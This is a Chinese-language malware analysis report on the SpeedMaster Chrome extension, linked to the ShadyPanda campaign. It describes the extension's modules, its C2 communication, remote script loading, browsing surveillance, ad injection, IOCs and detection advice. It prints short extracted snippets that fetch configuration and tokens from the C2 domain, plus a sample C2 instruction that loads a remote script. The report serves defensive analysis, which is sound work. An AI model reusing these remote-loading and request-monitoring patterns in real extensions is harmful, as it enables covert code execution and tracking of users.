# ShadyPanda SpeedMaster Chrome 插件恶意代码分析报告

## 概述
本报告分析了名为 "SpeedMaster" 的 Chrome 插件（ID: ibiejjpajlfljcgjndbonclhcbdcamai），该插件属于 ShadyPanda 恶意软件活动的一部分。根据参考报告，这是一个持续7年的恶意软件活动，感染了超过400万浏览器。

## 插件基本信息
- **插件名称**: SpeedMaster
- **版本**: 22.9.29.1444
- **manifest版本**: 2
- **权限**: `<all_urls>`, `background`, `notifications`, `webRequest`, `storage`
- **CSP策略**: `script-src 'self' blob: 'unsafe-eval'; object-src 'self'`

## 恶意代码位置分析

### 1. 核心恶意模块
- **`background/fuck.js`**: 主要恶意代码加载器
- **`background/safe_enrypt_wasm.js`**: 加密通信模块
- **`background/safe_enrypt_wasm_bg.wasm`**: WebAssembly 加密模块
- **`background/t.json`**: 恶意配置配置文件

### 2. 注入脚本
- **`def/a.js`**: 简单的消息发送脚本
- **`def/efg.js`**: 动态脚本注入器
- **`def/load_ad.js`**: 广告注入脚本
- **`def/load_ad_frame.js`**: 广告iframe注入脚本

### 3. 网络监控模块
- **`background/bg.js`**: 网络请求监控和数据处理
- **`background/webWorker.js`**: 后台工作线程，处理网络请求

## 恶意行为分析

### 1. 远程代码执行机制
**位置**: `background/fuck.js`
**功能**: 
- 定期从 `https://api.extensionplay.com/speed_master/t.json` 下载恶意配置
- 动态加载和执行远程JavaScript代码
- 使用WebAssembly进行加密通信

**关键代码**:
```javascript
const t = await fetch("https://api.extensionplay.com/speed_master/t.json?t=" + Date.now())
```

### 2. 数据包构造方式
**位置**: `background/webWorker.js` 和 `background/bg.js`
**构造方式**:
1. **Token获取**: 从 `https://api.extensionplay.com/speed-test/token` 获取认证token
2. **数据上报**: 使用XMLHttpRequest构造POST请求
3. **请求头构造**: 包含自定义的认证信息和时间戳

**关键代码**:
```javascript
e = "https://api.extensionplay.com/speed-test/token";
(n = new XMLHttpRequest()).open(t, e, true);
```

### 3. 指令接收和处理
**位置**: `background/fuck.js` 和 `def/efg.js`
**数据结构**:
```json
{
  "run_on": "content_scripts",
  "match": "\\.baidu.com$",
  "src": "https://static.cdnprod.com/js/baidu.js",
  "v": "1"
}
```

**处理流程**:
1. 插件从C2服务器下载配置
2. 根据`run_on`字段决定执行位置（background/content_scripts）
3. 根据`match`字段匹配目标网站
4. 从`src`字段下载并执行恶意脚本

### 4. 网络监控和数据收集
**位置**: `background/bg.js`
**功能**:
- 使用 `chrome.webRequest.onBeforeRequest` 监控所有网络请求
- 统计每个域名的请求次数
- 通过 `chrome.runtime.sendMessage` 上报数据

**关键代码**:
```javascript
chrome.webRequest.onBeforeRequest.addListener(function (e) {
  // 监控所有请求
}, {
  urls: ["<all_urls>"]
});
```

### 5. 广告注入和点击劫持
**位置**: `def/load_ad.js`
**功能**:
- 注入隐藏的iframe加载广告
- 使用第三方广告脚本 `the-news-desk.com/js/displaytag_master.min.js`
- 包含发布者密钥 `HR2900JSTAB004` 和子ID `HRJS04`

## C2通信分析

### 1. C2服务器
- **主C2**: `api.extensionplay.com`
- **配置下载**: `https://api.extensionplay.com/speed_master/t.json`
- **Token获取**: `https://api.extensionplay.com/speed-test/token`
- **广告脚本**: `static.cdnprod.com/js/baidu.js`

### 2. 通信协议
- **加密方式**: WebAssembly加密模块
- **请求方式**: HTTP GET/POST
- **数据格式**: JSON
- **更新频率**: 每小时检查更新（36e5毫秒）

### 3. 心跳机制
- 每小时从C2服务器拉取最新配置
- 使用本地存储缓存配置，减少网络请求
- 配置包含过期时间，确保及时更新

## 权限滥用分析

### 1. 过度权限
- `<all_urls>`: 访问所有网站
- `webRequest`: 拦截和修改所有网络请求
- `storage`: 本地存储恶意配置
- `background`: 后台持续运行

### 2. 权限利用
- **网络监控**: 收集用户浏览习惯
- **脚本注入**: 在任意网站执行恶意代码
- **广告注入**: 劫持流量获取收益
- **数据窃取**: 可能窃取敏感信息

## 与ShadyPanda活动的关联

根据参考报告 https://www.koi.ai/blog/4-million-browsers-infected-inside-shadypanda-7-year-malware-campaign，该插件具有以下特征：

1. **长期运营**: 版本号显示持续更新（22.9.29.1444）
2. **大规模感染**: 通过Chrome Web Store分发
3. **隐蔽性**: 伪装成网速测试工具
4. **模块化设计**: 支持远程更新恶意功能
5. **盈利模式**: 广告注入和流量劫持

## 检测建议

### 1. IOCs（威胁指标）
- **域名**: `api.extensionplay.com`, `static.cdnprod.com`, `the-news-desk.com`
- **文件哈希**: 需要计算具体文件哈希
- **插件ID**: `ibiejjpajlfljcgjndbonclhcbdcamai`

### 2. 行为检测
- 监控Chrome插件对`chrome.webRequest` API的使用
- 检测从远程服务器动态加载JavaScript的行为
- 识别WebAssembly加密模块的使用

### 3. 网络检测
- 拦截到`api.extensionplay.com`的请求
- 检测异常的广告注入流量
- 监控插件与未知域名的通信

## 结论

SpeedMaster Chrome插件是一个典型的ShadyPanda恶意软件，具有以下特征：

1. **高度隐蔽**: 伪装成合法工具，通过官方商店分发
2. **模块化设计**: 支持远程更新恶意功能
3. **数据收集**: 监控用户浏览行为
4. **广告欺诈**: 注入广告获取非法收益
5. **长期潜伏**: 设计为长期驻留系统

建议立即从系统中移除该插件，并检查是否有其他相关恶意软件感染。

---
**分析完成时间**: 2025年12月16日
**分析工具**: Spore恶意代码分析系统
**参考报告**: https://www.koi.ai/blog/4-million-browsers-infected-inside-shadypanda-7-year-malware-campaign